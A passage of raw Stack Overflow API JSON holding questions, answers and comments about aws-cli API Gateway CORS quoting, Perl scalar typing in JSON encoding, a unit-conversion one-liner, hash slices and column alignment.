"https://www.gravatar.com/avatar/e36a0bd40a907c7ab2e65085cfa13dce?s=128&d=identicon&r=PG", "display_name": "Josh", "link": "https://stackoverflow.com/users/841759/josh"}, "is_accepted": false, "score": 4, "last_activity_date": 1454711100, "creation_date": 1454711100, "answer_id": 35234594, "question_id": 35228488, "link": "https://stackoverflow.com/questions/35228488/api-gateway-cors-setup/35234594#35234594", "title": "api gateway CORS setup", "body": "<p>The issue did end up being the correct way to escape the characters.</p>\n\n<p><code>--response-parameters '{\"method.response.header.Access-Control-Allow-Origin\":\"'\"'*'\"'\"}'</code></p>\n\n<p>Apparently this was more about knowing the correct way to format the JSON.</p>\n"}], "owner": {"reputation": 312, "user_id": 841759, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e36a0bd40a907c7ab2e65085cfa13dce?s=128&d=identicon&r=PG", "display_name": "Josh", "link": "https://stackoverflow.com/users/841759/josh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2098, "favorite_count": 0, "accepted_answer_id": 35232121, "answer_count": 2, "score": 3, "last_activity_date": 1532944403, "creation_date": 1454688267, "question_id": 35228488, "link": "https://stackoverflow.com/questions/35228488/api-gateway-cors-setup", "title": "api gateway CORS setup", "body": "<p>I'm attempting to setup aws CORS from the command line using aws-cli in a deployment script.\nI have created the POST Resource with the following perl to shell command.\nI'm attempting to set the integration-response to '*' much like enabling cores would do.</p>\n\n<p><code>aws apigateway put-method-response \\\\\n--region \"$region\"                  \\\\\n--rest-api-id \"$api_id\"             \\\\\n--resource-id \"$resource_id\"        \\\\\n--http-method \"POST\"                \\\\\n--status-code 200                   \\\\\n--response-models '{\"application/json\":\"Empty\"}' \\\\\n--response-parameters '{\"method.response.header.Access-Control-Allow-Origin\":true}'</code></p>\n\n<p>When i run the following command to set the integration value.</p>\n\n<p><code>aws apigateway put-integration-response \\\\\n--region \"$region\"                  \\\\\n--rest-api-id \"$api_id\"             \\\\\n--resource-id \"$resource_id\"        \\\\\n--http-method \"$method\"                \\\\\n--status-code 200                   \\\\\n--response-template '{\"application/json\":\"Empty\"}' \\\\\n--response-parameters \\\\\n'{\"method.response.header.Access-Control-Allow-Origin\": \"'*'\"}'</code></p>\n\n<p>I get the following error.</p>\n\n<p>A client error (BadRequestException) occurred when calling the PutIntegrationResponse operation: Invalid mapping expression specified: Validation Result: warnings : [], errors : [Invalid mapping expression specified: *]</p>\n\n<p>Can anyone tell me what this error is really referring to or even a better way to go about a api gateway deployment script.</p>\n"}, {"tags": ["json", "perl", "variables"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1454685624, "post_id": 35227290, "comment_id": 58169774, "body": "<code>%arr</code> is a terrible name for a variable. First of all, it&#39;s a <i>hash</i>, not an array, and secondly the identifier should reflect a variables <i>purpose</i> rather than its nature. The <code>%</code> says that it&#39;s a hash, so <code>%hash</code> is superfluous and slightly ridiculous. But sometimes there is little to say, especially about aggregate data structures, and I have often resorted to <code>%data</code> which I think is fine"}, {"owner": {"reputation": 517, "user_id": 3644600, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/61a3ee9b50809e177a8d81c003a2d3e7?s=128&d=identicon&r=PG&f=1", "display_name": "Adrian Toma", "link": "https://stackoverflow.com/users/3644600/adrian-toma"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1454685870, "post_id": 35227290, "comment_id": 58169943, "body": "Thank you for suggestions , I do agree with you and made some changes in my example."}, {"owner": {"reputation": 919, "user_id": 5513684, "user_type": "registered", "accept_rate": 92, "profile_image": "https://graph.facebook.com/961769367178033/picture?type=large", "display_name": "Steven Carlson", "link": "https://stackoverflow.com/users/5513684/steven-carlson"}, "edited": false, "score": 0, "creation_date": 1454745877, "post_id": 35227290, "comment_id": 58191758, "body": "Only a thought suggestion, not sure if it will work in practice.  But could your wrap score1 with int?  EX: <code>my %hash_object = ( score1 =&gt; int($score1), score2 =&gt; $score2 );</code>"}], "answers": [{"comments": [{"owner": {"reputation": 517, "user_id": 3644600, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/61a3ee9b50809e177a8d81c003a2d3e7?s=128&d=identicon&r=PG&f=1", "display_name": "Adrian Toma", "link": "https://stackoverflow.com/users/3644600/adrian-toma"}, "edited": false, "score": 0, "creation_date": 1454686009, "post_id": 35227459, "comment_id": 58170027, "body": "I know there exists a number of &quot;hacks&quot; to force variable to integer, I was curious why perl make that change, because I just used my variable in some operation, I didn&#39;t made any assignment."}, {"owner": {"reputation": 19681, "user_id": 936986, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/075f0ea7418371ace9bba5b901409ab1?s=128&d=identicon&r=PG", "display_name": "Oleg V. Volkov", "link": "https://stackoverflow.com/users/936986/oleg-v-volkov"}, "reply_to_user": {"reputation": 517, "user_id": 3644600, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/61a3ee9b50809e177a8d81c003a2d3e7?s=128&d=identicon&r=PG&f=1", "display_name": "Adrian Toma", "link": "https://stackoverflow.com/users/3644600/adrian-toma"}, "edited": false, "score": 0, "creation_date": 1454686143, "post_id": 35227459, "comment_id": 58170131, "body": "To reiterate it again: you&#39;ve used it in <code>print</code>. That causes implicit stringification. Using <code>.</code> and any other operators/functions that operate on strings would cause that too."}, {"owner": {"reputation": 517, "user_id": 3644600, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/61a3ee9b50809e177a8d81c003a2d3e7?s=128&d=identicon&r=PG&f=1", "display_name": "Adrian Toma", "link": "https://stackoverflow.com/users/3644600/adrian-toma"}, "edited": false, "score": 1, "creation_date": 1454686475, "post_id": 35227459, "comment_id": 58170421, "body": "Thank you for your answer, I understand now that this is the expected behavior."}], "tags": [], "owner": {"reputation": 19681, "user_id": 936986, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/075f0ea7418371ace9bba5b901409ab1?s=128&d=identicon&r=PG", "display_name": "Oleg V. Volkov", "link": "https://stackoverflow.com/users/936986/oleg-v-volkov"}, "is_accepted": true, "score": 7, "last_activity_date": 1454686475, "last_edit_date": 1454686475, "creation_date": 1454685246, "answer_id": 35227459, "question_id": 35227290, "link": "https://stackoverflow.com/questions/35227290/determining-if-a-perl-scalar-is-a-string-or-integer/35227459#35227459", "title": "Determining if a perl scalar is a string or integer", "body": "<p>First, it is somewhat incorrect. Yes, every values is scalar, but scalars have separate numeric and string values. That's all you need to know for this particular question, so I'll leave details out.</p>\n\n<p>What you really need is to take a look at MAPPING / PERL -> JSON / simple scalars section of documentation for <a href=\"http://p3rl.org/JSON\" rel=\"nofollow\"><code>JSON</code></a> module:</p>\n\n<blockquote>\n  <p>JSON::XS and JSON::PP will encode undefined scalars as JSON null\n  values, scalars that have last been used in a string context before\n  encoding as JSON strings, and anything else as number value.</p>\n</blockquote>\n\n<p>(The docs are actually slightly wrong here. It is not \"last been used in string context\" it should be \"was ever used in string context\" - once scalar obtains string value it won't go away until you <strong>explicitly write</strong> a new number into it.)</p>\n\n<blockquote>\n  <p>You can force the type to be a string by stringifying it:</p>\n</blockquote>\n\n<pre><code>my $x = 3.1; # some variable containing a number\n\"$x\";        # stringified\n$x .= \"\";    # another, more awkward way to stringify\nprint $x;    # perl does it for you, too, quite often\n</code></pre>\n\n<p><strong>Incidentally this comment above is exactly about why your 998 turned to string.</strong></p>\n\n<blockquote>\n  <p>You can force the type to be a number by numifying it:</p>\n</blockquote>\n\n<pre><code>my $x = \"3\"; # some variable containing a string\n$x += 0;     # numify it, ensuring it will be dumped as a number\n$x *= 1;     # same thing, the choice is yours.\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 19681, "user_id": 936986, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/075f0ea7418371ace9bba5b901409ab1?s=128&d=identicon&r=PG", "display_name": "Oleg V. Volkov", "link": "https://stackoverflow.com/users/936986/oleg-v-volkov"}, "edited": false, "score": 0, "creation_date": 1454685543, "post_id": 35227498, "comment_id": 58169728, "body": "No, not &quot;recently used&quot;. <code>use JSON; my $aaa = 123; print &quot;$aaa\\n&quot;; my $bbb = $aaa + 456; print JSON::encode_json({ aaa =&gt; $aaa });</code> will still give <code>{&quot;aaa&quot;:&quot;123&quot;}</code> despite using <code>$aaa</code> in addition. If scalar have string representation that it automatically acquires after any string operation, <code>JSON</code> will serialize as string. You need to write brand new value into it to get rid of string part."}, {"owner": {"reputation": 517, "user_id": 3644600, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/61a3ee9b50809e177a8d81c003a2d3e7?s=128&d=identicon&r=PG&f=1", "display_name": "Adrian Toma", "link": "https://stackoverflow.com/users/3644600/adrian-toma"}, "edited": false, "score": 5, "creation_date": 1454686083, "post_id": 35227498, "comment_id": 58170083, "body": "<code>This is a very rare problem, as most software will accept either a quoted or unquoted representation of a number</code> I do not agree, what happens if I need to use that value in C/C++? more lines of code to ensure that string value is indeed a number."}, {"owner": {"reputation": 2414, "user_id": 5379657, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7ab4a9ac2ee2c7a27f5d976d6a787970?s=128&d=identicon&r=PG&f=1", "display_name": "Jeff Y", "link": "https://stackoverflow.com/users/5379657/jeff-y"}, "reply_to_user": {"reputation": 19681, "user_id": 936986, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/075f0ea7418371ace9bba5b901409ab1?s=128&d=identicon&r=PG", "display_name": "Oleg V. Volkov", "link": "https://stackoverflow.com/users/936986/oleg-v-volkov"}, "edited": false, "score": 1, "creation_date": 1454686192, "post_id": 35227498, "comment_id": 58170170, "body": "@OlegV.Volkov Yes, according the info in your answer, the type is determined by &quot;context in which it was most recently used&quot;. (Re)Assignment is not necessary."}, {"owner": {"reputation": 19681, "user_id": 936986, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/075f0ea7418371ace9bba5b901409ab1?s=128&d=identicon&r=PG", "display_name": "Oleg V. Volkov", "link": "https://stackoverflow.com/users/936986/oleg-v-volkov"}, "edited": false, "score": 4, "creation_date": 1454686271, "post_id": 35227498, "comment_id": 58170223, "body": "I&#39;d also argue if it is &quot;rare&quot; problem or not. If you&#39;re making output for public API, you don&#39;t know if language on other side treats strings and numbers differently. Will it be Lua that treats them differently in table keys? Will it be C, that simply strongly typed and would croak? It is better to take care to return a number when you mean number."}, {"owner": {"reputation": 19681, "user_id": 936986, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/075f0ea7418371ace9bba5b901409ab1?s=128&d=identicon&r=PG", "display_name": "Oleg V. Volkov", "link": "https://stackoverflow.com/users/936986/oleg-v-volkov"}, "reply_to_user": {"reputation": 2414, "user_id": 5379657, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7ab4a9ac2ee2c7a27f5d976d6a787970?s=128&d=identicon&r=PG&f=1", "display_name": "Jeff Y", "link": "https://stackoverflow.com/users/5379657/jeff-y"}, "edited": false, "score": 0, "creation_date": 1454686335, "post_id": 35227498, "comment_id": 58170289, "body": "@JeffY, I posted a snippet just for that. No, not &quot;last used&quot;. Correct is &quot;was ever used&quot;. I guess I add a comment to quote from docs."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 517, "user_id": 3644600, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/61a3ee9b50809e177a8d81c003a2d3e7?s=128&d=identicon&r=PG&f=1", "display_name": "Adrian Toma", "link": "https://stackoverflow.com/users/3644600/adrian-toma"}, "edited": false, "score": 3, "creation_date": 1454686767, "post_id": 35227498, "comment_id": 58170626, "body": "@AdrianToma: Yes, there are exceptions. But it is inexcusable for a program that consumes JSON data to die if it sees <code>field: &quot;999&quot;</code> instead of <code>field: 999</code>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 19681, "user_id": 936986, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/075f0ea7418371ace9bba5b901409ab1?s=128&d=identicon&r=PG", "display_name": "Oleg V. Volkov", "link": "https://stackoverflow.com/users/936986/oleg-v-volkov"}, "edited": false, "score": 3, "creation_date": 1454687013, "post_id": 35227498, "comment_id": 58170784, "body": "@OlegV.Volkov: <i>&quot;take care to return a number when you mean number&quot;</i> That isn&#39;t so straightforward. For example, is a zip code a number? In XML everything is a string, and it seems odd to require sources of JSON data \u2014 a vastly simpler seriaising format \u2014 to be so careful about whether they put quotes around numeric data"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1454712071, "post_id": 35227498, "comment_id": 58184257, "body": "I hesitate to add to a comment froth, but everybody should remember that JSON is inherently a text-based standard. <i>Every</i> value is a text string, whether or not it is enclosed in quotes, and a lack of quotes is an invitation for the intervening software layer to convert that text string to a number of any sort and any precision. That&#39;s not what I want of my software; I want to see all of the the characters that come from the JSON document and to be able to convert them to a numeric value according to the context."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1454712235, "post_id": 35227498, "comment_id": 58184315, "body": "If my data looks like <code>{ &quot;pi&quot;: 3.14159265358979323846264338327950288419716939937510582 }</code> then <code>from_json</code> returns <code>{ pi =&gt; 3.14159265358979 }</code> and that is to be <i>avoided</i> where possible"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 3, "last_activity_date": 1467889973, "last_edit_date": 1467889973, "creation_date": 1454685371, "answer_id": 35227498, "question_id": 35227290, "link": "https://stackoverflow.com/questions/35227290/determining-if-a-perl-scalar-is-a-string-or-integer/35227498#35227498", "title": "Determining if a perl scalar is a string or integer", "body": "<p>Perl scalars may hold both a string and a scalar value simultaneously. Either of those is valid as a JSON value, so the <em>string value</em> is always used if there is one</p>\n\n<p>This is a rare problem, as most software should accept either a quoted or unquoted representation of a number. <em>Everything</em> in a JSON document is originally a string, and significant data may be lost by requiring the module to apply an arbitrary string \u2192 float conversion before it hands you the data</p>\n\n<p>But if you really need to write a numeric value without quotation marks then you can coerce a scalar to behave as a numeric type: just add zero to it. </p>\n\n<p>Likewise, if a scalar variable holds only a numeric variable then you can force Perl to generate and store its equivalent string just by using it as a string. The most obvious method for me is to enclose it in quotation marks</p>\n\n<p>This code appears to do what you want</p>\n\n<pre><code>use strict;\nuse warnings 'all';\nuse feature 'say';\n\nuse JSON;\n\nmy ($score1, $score2) = (998, 999);\n\nprint \"score1: $score1\\n\";\n\nmy %data = ( score1 =&gt; 0+$score1, score2 =&gt; 0+$score2 );\n\nsay encode_json(\\%data);\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>score1: 998\n{\"score1\":998,\"score2\":999}\n</code></pre>\n"}], "owner": {"reputation": 517, "user_id": 3644600, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/61a3ee9b50809e177a8d81c003a2d3e7?s=128&d=identicon&r=PG&f=1", "display_name": "Adrian Toma", "link": "https://stackoverflow.com/users/3644600/adrian-toma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1422, "favorite_count": 0, "accepted_answer_id": 35227459, "answer_count": 2, "score": 4, "last_activity_date": 1467889973, "creation_date": 1454684719, "last_edit_date": 1454685813, "question_id": 35227290, "link": "https://stackoverflow.com/questions/35227290/determining-if-a-perl-scalar-is-a-string-or-integer", "title": "Determining if a perl scalar is a string or integer", "body": "<p>From what I read, perl doesn't have a real type for integer or string, for him any $variable is scalar. </p>\n\n<p>Recently I had a lot of trouble with an old script that was generating JSON objects required by another process for which values inside JSON must be integers, after some debug I found that because a simple print function: </p>\n\n<blockquote>\n  <p>JSON::encode_json</p>\n</blockquote>\n\n<p>was generating a string instead an integer, here's my example:</p>\n\n<pre><code>use strict; \nuse warnings; \nuse JSON;\nmy $score1 = 998;\nmy $score2 = 999;\nprint \"score1: \".$score1.\"\\n\";\nmy %hash_object = ( score1 =&gt; $score1, score2 =&gt; $score2 );\nmy $json_str = encode_json(\\%hash_object);  # This will work now\nprint \"$json_str\";\n</code></pre>\n\n<p>And it outputs:</p>\n\n<pre><code>score1: 998\n{\"score1\":\"998\",\"score2\":999}\n</code></pre>\n\n<p>Somehow perl variables have a type or at least this is how JSON::encode_json thinks.</p>\n\n<p>Is there a way to find this type programmatically and why this type is changed when making an operation like the concatenation above?</p>\n"}, {"tags": ["python", "linux", "bash", "perl"], "comments": [{"owner": {"reputation": 3424, "user_id": 3750257, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KF8gx.png?s=128&g=1", "display_name": "pppery", "link": "https://stackoverflow.com/users/3750257/pppery"}, "edited": false, "score": 1, "creation_date": 1454680265, "post_id": 35225702, "comment_id": 58165978, "body": "Stack OverFlow is not a code writing serivce"}, {"owner": {"reputation": 50452, "user_id": 33258, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/c4b21ea020b4d95c4abacaffc9daaf4e?s=128&d=identicon&r=PG", "display_name": "Hugh Bothwell", "link": "https://stackoverflow.com/users/33258/hugh-bothwell"}, "edited": false, "score": 0, "creation_date": 1454680414, "post_id": 35225702, "comment_id": 58166079, "body": "1. open the file, 2. for each line, 3. if the first character is not a digit, copy the line to output, 4. otherwise split the line, convert each piece to float, divide by 1000, convert back to a line of text, write to output. It should take you about 6 minutes to write and test."}, {"owner": {"reputation": 350, "user_id": 5888317, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2f515b6bfb13d81f8f139f56f2f51f7e?s=128&d=identicon&r=PG&f=1", "display_name": "matman9", "link": "https://stackoverflow.com/users/5888317/matman9"}, "edited": false, "score": 1, "creation_date": 1454681305, "post_id": 35225702, "comment_id": 58166718, "body": "i&#39;m new to coding so didn&#39;t really know where to start. so far i&#39;ve tried to read the file in, remove text and blank spaces and convert to a list then divide but wasn&#39;t making any progress. apologies if it comes across as &#39;please write this code for me&#39;, wasn&#39;t intended - just needed some pointers. thanks, hugh, i&#39;ll try that."}, {"owner": {"reputation": 74843, "user_id": 2988730, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/ZOX7t.jpg?s=128&g=1", "display_name": "Mad Physicist", "link": "https://stackoverflow.com/users/2988730/mad-physicist"}, "edited": false, "score": 2, "creation_date": 1454692768, "post_id": 35225702, "comment_id": 58174376, "body": "Thanks for paying attention to user comments (even after getting shut down) instead of just adding a whiney line explaining why your question should be reopened, as so many people do."}], "answers": [{"tags": [], "owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "is_accepted": true, "score": 1, "last_activity_date": 1454685574, "creation_date": 1454685574, "answer_id": 35227572, "question_id": 35225702, "link": "https://stackoverflow.com/questions/35225702/unit-conversion-from-mm-to-m-in-text-file-with-text-and-numbers/35227572#35227572", "title": "Unit conversion from mm to m in text file with text and numbers", "body": "<p>Easy in perl</p>\n\n<pre><code>perl -pe 's-(\\d+.?\\d*)-($1/1000)-ge' file\n\nadd\ntube\n3033.303 2998.20695111 106.1801625\n0.060325 6.22260621\ny\n0 0\n0\nadd\ncube\n3027.18924332 3032.17578955 114.50875\n0.1689 6.17076909\ny\n0 0\n0\n</code></pre>\n"}], "owner": {"reputation": 350, "user_id": 5888317, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2f515b6bfb13d81f8f139f56f2f51f7e?s=128&d=identicon&r=PG&f=1", "display_name": "matman9", "link": "https://stackoverflow.com/users/5888317/matman9"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 206, "favorite_count": 0, "accepted_answer_id": 35227572, "answer_count": 1, "score": -6, "last_activity_date": 1454936101, "creation_date": 1454679806, "last_edit_date": 1454936101, "question_id": 35225702, "link": "https://stackoverflow.com/questions/35225702/unit-conversion-from-mm-to-m-in-text-file-with-text-and-numbers", "title": "Unit conversion from mm to m in text file with text and numbers", "body": "<p>I'm trying to convert the following style text file from mm to m (i.e., divide all numbers by 1000). It's made up of a regular pattern and contains text as well as numbers.</p>\n\n<p>I have managed to solve (eventually) using python, it's a bit rough and ready but it completes the task. Any suggestions/improvements would be greatly appreciated. </p>\n\n<pre><code>import re\nimport numpy as np\nimport linecache\nfrom io import StringIO\n\nmyfile = \"file\"\nresults = open(\"results.txt\",\"w\")\n\nfor i in range(1,50000):\n    line = linecache.getline(myfile,i)\n    if re.search('[a-zA-Z]', line):\n        results.write(line)    \n    elif line.isspace():\n        results.write(str(line))\n    elif re.search('[-]', line):\n        results.write(str(line))\n    else:\n        c = StringIO(line)\n        data = np.loadtxt(c)\n        a = np.array(data)\n        c = a / 1000\n        d = str(c).replace('[','').replace(']','')\n        results.write(str(d)+'\\n')\nresults.close()\n</code></pre>\n\n<p>the file is like so:</p>\n\n<pre><code>add\ntube\n3033303.0 2998206.95111 106180.1625\n60.325 6222.60621\ny\n0.0 0.0\n0.0\nadd\ncube\n3027189.24332 3032175.78955 114508.75\n168.9 6170.76909\ny\n0.0 0.0\n0.0\n</code></pre>\n\n<p>Desired outcome would be;</p>\n\n<pre><code>add\ntube\n3033.3030 2998.20695111 106.1801625\n0.060325 6.22260621\ny\n0.0 0.0\n0.0\nadd\ncube\n3027.18924332 3032.17578955 114.50875\n0.1689 6.17076909\ny\n0.0 0.0\n0.0\n</code></pre>\n"}, {"tags": ["arrays", "perl", "hash"], "answers": [{"tags": [], "owner": {"reputation": 19681, "user_id": 936986, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/075f0ea7418371ace9bba5b901409ab1?s=128&d=identicon&r=PG", "display_name": "Oleg V. Volkov", "link": "https://stackoverflow.com/users/936986/oleg-v-volkov"}, "is_accepted": true, "score": 4, "last_activity_date": 1454679539, "creation_date": 1454679539, "answer_id": 35225622, "question_id": 35225477, "link": "https://stackoverflow.com/questions/35225477/assign-arrays-to-hash-subkeys/35225622#35225622", "title": "Assign arrays to hash subkeys", "body": "<p>You need to close the hashref part in a <code>@{}</code> slice \"cast\".</p>\n\n<pre><code>@{$hash{\"key\"}}{@subkeys} = @vals;\n</code></pre>\n"}], "owner": {"reputation": 9698, "user_id": 111036, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/4d7fd4b3ed484fc72aa50e4abf323393?s=128&d=identicon&r=PG", "display_name": "mivk", "link": "https://stackoverflow.com/users/111036/mivk"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 0, "accepted_answer_id": 35225622, "answer_count": 1, "score": 2, "last_activity_date": 1454679539, "creation_date": 1454679034, "question_id": 35225477, "link": "https://stackoverflow.com/questions/35225477/assign-arrays-to-hash-subkeys", "title": "Assign arrays to hash subkeys", "body": "<p>Given an array of keys and an array of values, I can create a hash with these keys and values using <code>@hash{@keys} = @vals</code>.</p>\n\n<p>However, I would like to do this for subkeys of a hash. This does not work: <code>$h{\"key\"}{@subkeys} = @vals</code>.</p>\n\n<pre><code>$ perl -MData::Dumper -le '\n  @subkeys=(qw(one two));\n  @vals=(1, 2);\n  $hash{\"key\"}{@subkeys} = @vals;\n  for (qw(subkeys vals)) {\n    print \"$_ :\\n\", Dumper(\\@{$_})\n  };\n  print \"hash: \\n\", Dumper(\\%hash);'\n</code></pre>\n\n<p>What I get is:</p>\n\n<pre><code>subkeys :\n$VAR1 = [\n          'one',\n          'two'\n        ];\n\nvals :\n$VAR1 = [\n          1,\n          2\n        ];\n\nhash: \n$VAR1 = {\n          'key' =&gt; {\n                     '2' =&gt; 2\n                   }\n        };\n</code></pre>\n\n<p>If this is possible, what would be the correct syntax to get the following Dumper result:</p>\n\n<pre><code>$VAR1 = {\n          'key' =&gt; {\n                     'one' =&gt; 1,\n                     'two' =&gt; 2\n                   }\n        };\n</code></pre>\n\n<p>It does work when using a temporary hash:</p>\n\n<pre><code>perl -MData::Dumper -le '@subkeys=(qw(one two)); @vals=(1, 2); @tmp{@subkeys}=@vals; $hash{\"key\"}={%tmp}; print Dumper(\\%hash)'\n</code></pre>\n\n<p>But I suspect I'm just missing the correct syntax to get it without the <code>%tmp</code> hash.</p>\n"}, {"tags": ["regex", "perl"], "answers": [{"comments": [{"owner": {"reputation": 5455, "user_id": 3961170, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/PtFol.jpg?s=128&g=1", "display_name": "mkHun", "link": "https://stackoverflow.com/users/3961170/mkhun"}, "edited": false, "score": 0, "creation_date": 1454678353, "post_id": 35224852, "comment_id": 58164617, "body": "@Sorbique User input looks like PDB format. Mostly pdb files will not have whitespace in atom record. So better avoid using split with whitespace for PDB files."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "reply_to_user": {"reputation": 5455, "user_id": 3961170, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/PtFol.jpg?s=128&g=1", "display_name": "mkHun", "link": "https://stackoverflow.com/users/3961170/mkhun"}, "edited": false, "score": 0, "creation_date": 1454686534, "post_id": 35224852, "comment_id": 58170457, "body": "@mkHun Huh? There&#39;s whitespace in the example data in the question."}, {"owner": {"reputation": 5455, "user_id": 3961170, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/PtFol.jpg?s=128&g=1", "display_name": "mkHun", "link": "https://stackoverflow.com/users/3961170/mkhun"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1454690190, "post_id": 35224852, "comment_id": 58172859, "body": "@MattJacob There example data contain whitespace but most of the PDB files not have the whitespace for example <code>ATOM    188  O   HIS A  24      19.075  22.262  50.693  1.00108.06           O</code>  from this PDB file (<a href=\"http://www.rcsb.org/pdb/files/1mkh.pdb\" rel=\"nofollow noreferrer\">rcsb.org/pdb/files/1mkh.pdb</a>). So most of the bioinformatician uses <code>substr</code> for extract the data by the fixed offset and length by this PDB FORMAT (<a href=\"http://deposit.rcsb.org/adit/docs/pdb_atom_format.html\" rel=\"nofollow noreferrer\">deposit.rcsb.org/adit/docs/pdb_atom_format.html</a>) :)"}], "tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 0, "last_activity_date": 1454677041, "creation_date": 1454677041, "answer_id": 35224852, "question_id": 35224788, "link": "https://stackoverflow.com/questions/35224788/how-to-keep-the-column-left-aligned-in-perl/35224852#35224852", "title": "How to keep the column left aligned in perl", "body": "<p>There's two solutions to this - either <a href=\"http://perldoc.perl.org/functions/sprintf.html\" rel=\"nofollow\"><code>sprintf</code></a> to set field widths for printing or use <code>\\t</code> :</p>\n\n<pre><code>$line1 = join ( \"\\t\", split ( ' ', $line1 ) ); \n</code></pre>\n\n<p>This splits it on any whitespace, and sticks it back together again with tab stops. Which should left align your columns again. </p>\n\n<p>With <code>sprintf</code> you can specify a format, and allows you to configure e.g. leading zeros, number of decimals or just string alignment. I think it's perhaps a bit overkill for what you're doing though. </p>\n"}, {"tags": [], "owner": {"reputation": 28754, "user_id": 1153938, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/deBjQ.jpg?s=128&g=1", "display_name": "Vorsprung", "link": "https://stackoverflow.com/users/1153938/vorsprung"}, "is_accepted": false, "score": 0, "last_activity_date": 1454679044, "last_edit_date": 1454679044, "creation_date": 1454678243, "answer_id": 35225235, "question_id": 35224788, 